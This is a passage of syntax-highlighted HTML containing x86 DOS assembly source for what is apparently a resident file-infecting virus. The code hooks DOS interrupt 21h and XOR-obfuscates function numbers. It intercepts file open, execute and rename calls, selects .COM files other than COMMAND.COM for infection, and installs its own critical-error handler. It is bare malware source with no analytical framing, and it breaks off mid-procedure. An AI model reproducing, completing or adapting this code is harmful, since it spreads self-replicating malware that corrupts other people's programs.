         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3000h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">5300h</span><span class="sc4">+</span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_spice_fu</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_spice_fu</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3dh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Open file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_exam_fil</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_exam_fil</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Close file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_pre_test</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_pre_test</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">43h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Get or set file attributes</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_exam_fil</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_exam_fil</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">4bh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Load and/or execute program?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_exam_fil</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_exam_fil</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">56h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Rename file</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_exam_fil</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_exam_fil</span><span class="sc0">
</span><span class="sc5">int21_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">jmp_spice_fu</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">spice_functi</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">jmp_exam_fil</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">examine_file</span><span class="sc0">
</span><span class="sc5">jmp_pre_test</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pre_tst_func</span><span class="sc0">
</span><span class="sc5">spice_functi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Correct stack pointer</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_handle_</span><span class="sc4">],</span><span class="sc12">'SG'</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = offset of original code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store offset of original code</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">psp_segment</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">psp_segment</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Store segment of PSP for current...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">psp_segment</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DS = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">psp_segment</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ES = segment of PSP for current ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">4ah</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Resize memory block</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; BX = new size in paragraphs</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">4ah</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Resize memory block</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; BX = new size in paragraphs</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">psp_segment</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SS = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0fffah</span><span class="sc0">       </span><span class="sc1">; SP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fffeh</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fffch</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">; Store segment of PSP for current...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fffah</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Store instruction pointer</span><span class="sc0">

         </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">; Set direction flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; SI = offset of original code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Add offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DI = offset of original code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Add offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Decrease SI</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Decrease DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; CX = offset of original code</span><span class="sc0">
</span><span class="sc5">move_origin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of original code</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of original code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_origin</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; SI = offset of original code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Add offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">move_origin_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of original code</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of original code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_origin_</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Zero BP</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Return far!</span><span class="sc0">
</span><span class="sc5">examine_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_store</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_name</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to infect_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_exe_sig</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to infect_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tst_filesize</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to infect_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">
</span><span class="sc5">infect_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_infect</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">examin_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to examin_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_functio</span><span class="sc0">
</span><span class="sc5">examin_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_load</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int21_exit</span><span class="sc0">

</span><span class="sc5">int24_store</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get and set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = offset of interrupt 24h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX = segment of interrupt 24h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc1">; Set interrupt segment 24h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">examine_name</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine filename</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examine_name</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to examine_name</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">      </span><span class="sc1">; SI = offset of last two bytes of...</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = two bytes of filename</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0101111101011111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'DN'</span><span class="sc0">             </span><span class="sc1">; COMMAND.COM?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examin_exit_</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to examin_exit_</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = dot after filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">              </span><span class="sc1">; Dot after filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examin_exit_</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to examin_exit_</span><span class="sc0">

         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = two bytes of file extension</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0101111101011111b</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc12">'OC'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examin_exit_</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to examin_exit_</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of file extension</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examin_exit_</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to examin_exit_</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">examin_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">test_exe_sig</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test EXE signature</span><span class="sc0">
